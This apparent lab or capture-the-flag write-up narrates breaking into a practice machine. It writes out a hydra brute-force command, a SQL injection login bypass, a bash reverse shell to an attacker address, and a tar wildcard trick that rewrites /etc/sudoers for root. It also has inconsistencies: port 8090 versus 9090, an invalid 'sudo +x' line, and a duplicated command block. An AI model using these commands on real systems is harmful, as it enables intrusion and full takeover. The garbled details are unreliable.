I performed an aggressive port scan against the three TCP ports and received the result above. The HTTP application on port 80 sounds interesting to me. There is also some sort of Ubuntu application on port 8090.

Enumeration

Port 80: HTTP

The webpage above is displayed for the web application above. There are buttons on the webpage; however, they are not interactive. The source-code of the webpage does not contain anything useful either. Time to perform a directory search to identify any hidden files, directories, etc.


I identified the login.php webpage, as shown above. I tried default credentials of admin:admin, admin:root, and root:root, but I had no luck.


However, using hydra and the command hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.229.10 http-post-form "/login.php:username=admin&password=^PASS^:Invalid password\!", I was able to bruteforce the password sleepy of the user admin as shown above. Now I have the credentials admin:sleepy.


Even after using the credentials admin:sleepy, I was unsuccessful as the webpage above was returned to me.

Exploitation


I used a semi-colon for username input field and pressed the LOGIN button, and obtained the useful MySQL error message shown above. It seems like the web application is vulnerable to MySQL injection attacks.


And bingo! Using the payload ' ORDER BY 1-- //, I managed to bypass the login process and received the webpage shown above. There are two usernames here: james and cameron with their password hashes.


Those passwords hashes are in base64 format. I decoded the first password hash Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI= by using the command echo Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI= | base64 -d and obtained the password canttouchhhthiss@455152. This password belongs to the user james. Then I used the command echo dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy | base64 -d to decode the password hash dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy of user cameron and obtained the password thisscanttbetouchedd@455152. Now I have three sets of credentials. I used these three credentials against the SSH application on port 22, but I had no luck.

Port 9090: HTTP

This web application takes in a username and password. Maybe I can use the set of three credentials here? Two credentials failed. However, when I used the credentials james:canttouchhhthiss@455152 at this web application -- I got a hit!


I successfully logged in as the user james as shown above.


After some manual enumeration, I identified there is a terminal application. Using this terminal feature, I issued some commands and obtained more information. I can use this to obtain a reverse shell connection.


I started a listener on my machine at port 8443. Then using the bash reverse shell bash -c "/bin/bash -i >& /dev/tcp/192.168.45.198/8443 0>&1" at the terminal feature, I obtained a reverse shell connection on my machine at port 8443 as shown above. Now I have a foothold on the target machine with the session as the user james.

Privilege Escalation


Running sudo -l shows the interesting entry above. The entry /usr/bin/tar -czvf /tmp/backup.tar.gz * has wildcard injection vulnerability; therefore, it can be executed with root privileges to gain a root shell.

echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > privesc.sh
sudo +x privesc.sh
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
sudo /bin/bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > privesc.sh
sudo +x privesc.sh
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
sudo /bin/bash

Since I can exploit the wildcard vulnerability for the tar binary, I issued the commands above to spawn a root shell on the target machine.


And bingo! Now I have a root shell. GG.
